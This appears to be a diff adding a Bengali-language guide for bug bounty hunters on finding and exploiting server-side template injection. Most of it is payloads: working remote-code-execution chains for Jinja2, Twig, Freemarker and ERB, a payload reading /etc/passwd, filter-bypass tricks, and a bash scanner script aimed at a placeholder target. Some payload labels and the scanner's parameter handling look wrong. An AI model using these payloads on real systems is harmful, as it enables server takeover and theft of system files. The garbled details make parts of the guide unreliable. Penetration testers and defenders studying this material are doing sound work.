@@ -1,0 +1,146 @@
+Server-Side Template Injection (SSTI) খুঁজতে payload crafting আর error observation এর উপর ফোকাস করো। ধাপে ধাপে process:
+
+🎯 কোথায় খুঁজবে (Prime Locations)
+
+1. User input → HTML output: Profile, comments, search results
+2. Dynamic pages: /search?q=, /user/{id}, /post/{slug}
+3. API responses with user data
+4. Error pages, debug pages
+5. Admin panels, CMS inputs
+
+🔍 Detection Methodology
+Step 1: Basic Payload Testing
+# সব template engine এ common payloads
+{{7*7}}          → 49 (Number template)
+{{7}}*'7         → Template detected
+${7*7}           → 49 (Expression Language)
+<%= 7*7 %>       → 49 (ERB/Rails)
+#{7*7}           → 49 (Struts)
+<% 7*7 %>        → 49 (JSP)
+
+Step 2: Engine Fingerprinting
+# Jinja2/Twig (Python/PHP)
+{{config}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{7*'7'}}
+
+# Freemarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+
+# ERB (Ruby)
+<%= system('id') %>
+
+# Velocity (Java)
+#set($str=$class.inspect("java.lang.String").type)
+🛠️ Step-by-Step Testing Process
+Burp Suite Workflow
+
+
+
+1. Repeater → User input field এ basic payloads পাঠাও
+2. Response চেক করো:
+   ✅ 49 = Template Injection confirmed
+   ✅ Different output = Engine variation
+   ❌ Same output = No injection
+
+3. Intruder → Payload positions:
+   GET /search?q=§§§
+   POST body: {"name": "§§§"}
+cURL Testing
+bash
+
+
+
+# Basic detection
+curl -G "https://target.com/search" \
+  --data-urlencode "q={{7*7}}"
+
+# Fingerprinting
+curl -G "https://target.com/profile" \
+  --data-urlencode "name={{config}}"
+🔥 Engine-Specific Exploitation
+1. Jinja2 (Python) - Most Common
+
+
+
+Detection: {{7*7}} → 49
+
+RCE Chain:
+{{''.__class__.__mro__[1].__subclasses__()}}
+→ lipsum.__globals__.__builtins__.__import__('os').popen('id').read()
+→ {{lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+
+File Read:
+{{get_flashed_messages().__globals__.__builtins__.open('/etc/passwd').read()}}
+2. Twig (PHP)
+
+
+
+Detection: {{7*'7'}} → 7777777
+
+RCE:
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.setCache("php")}}{{_self.env.loadTemplate("php")}}
+3. Freemarker (Java)
+
+
+
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+📋 Reproduction Steps (Report Ready)
+
+
+
+1. Navigate: https://target.com/search
+2. Input: q={{7*7}}
+3. Expected: "49" (Proof of injection)
+4. RCE Demo: {{''.__class__.__mro__[1].__subclasses__()}}
+5. Impact: Full server access demonstrated via `id` command
+🧪 Burp Extension Recommendation
+
+
+
+1. SSTImap → Automated SSTI detection
+2. Collaborator → External interaction tracking
+3. Turbo Intruder → Fast payload testing
+🔄 Bypass Techniques
+
+
+
+# URL encoding
+{{7*7}} → %7B%7B7*7%7D%7D
+
+# Whitespace bypass
+{{ 7 * 7 }}
+{{"7"*7}}
+
+# Case bypass (some engines)
+{{Config}}
+{{cOnFiG}}
+💥 Impact Proof (Safe Demo)
+
+
+
+✅ Detection: {{7*7}} → 49
+✅ Fingerprint: {{config.items()}}
+✅ RCE: lipsum.__globals__.__builtins__.__import__('os').popen('id').read()
+✅ File read: /proc/version (no harm)
+🚀 Quick Scanner Script
+bash
+
+
+
+#!/bin/bash
+urls=( "/search?q=" "/user?name=" "/profile?display=" )
+payloads=( "{{7*7}}" "${7*7}" "<%=7*7%>" )
+
+for url in "${urls[@]}"; do
+  for payload in "${payloads[@]}"; do
+    response=$(curl -s -G "https://target.com${url}" \
+      --data-urlencode "${url##*=}${payload}")
+    
+    if [[ $response == *"49"* ]]; then
+      echo "[+] SSTI FOUND: https://target.com${url}${payload}"
+    fi
+  done
+done
+Golden Rule: Response এ 49, 7777777, অথবা unexpected output দেখলে immediately fingerprint করো। Jinja2 সবচেয়ে common।
